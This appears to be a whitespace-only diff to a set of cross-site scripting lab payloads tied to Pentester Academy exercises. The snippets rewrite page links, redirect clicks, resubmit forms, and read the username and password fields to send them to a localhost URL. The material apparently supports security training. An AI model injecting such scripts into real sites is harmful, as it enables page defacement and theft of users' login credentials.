@@ -15,6 +15,7 @@ document.getElementsByTagName("h1")[0].innerHTML = "Found You";
 var links = document.getElementsByTagName("a");
 
 for  (i=0; i < links.length; i++)
+	
 {
   links[i].href = "http://PentesterAcademy.com/topics";
   links[i].innerHTML = "Link Modified";
@@ -77,6 +78,7 @@ document.forms[0].parentNode.removeChild(document.forms[0]);
 <script>
 
 function CaughtClick () 
+
 {
 	location.href = "https://www.PentesterAcademy.com";
 }
@@ -138,13 +140,13 @@ document.getElementsByTagName("img")[0].src = "https://pluralsight2.imgix.net/pa
 
 <script>
 	
-window.setTimeout( function() 
+window.setTimeout(function() 
 
 {
 	document.forms[0].action = 'http://localhost';
 	document.forms[0].submit();
 
-}, 10000);
+},10000);
 	
 </script>
 
@@ -156,14 +158,14 @@ window.setTimeout( function()
 username = document.forms[0].elements[0].value;
 password = document.forms[0].elements[1].value;
 
-window.setTimeout( function() 
+window.setTimeout(function() 
 
 {
 	var req = new XMLHTTPRequest();
 	req.open("GET", "http://localhost/?username="+username+"&password="+password, true);
 	req.send();
 
-}, 10000);
+},10000);
 	
 </script>
 
